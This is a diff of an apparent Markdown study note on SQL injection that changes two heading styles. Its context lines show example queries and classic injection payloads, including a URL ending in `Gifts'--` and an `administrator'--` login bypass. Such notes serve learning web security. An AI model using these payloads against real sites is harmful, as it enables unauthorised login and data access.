@@ -67,13 +67,13 @@ Basic Query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
 
 Basic Payload: `https://insecure-website.com/products?category=Gifts'--`
 
-## [](#header-4) Subverting Application Logic
+### Subverting Application Logic
 
 Query: `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
 
 Payload: `administrator'--`
 
-## [](#header-4) Retrieving data from other database tables
+### Retrieving data from other database tables
 
 Query: `SELECT name, description FROM products WHERE category = 'Gifts'`
 
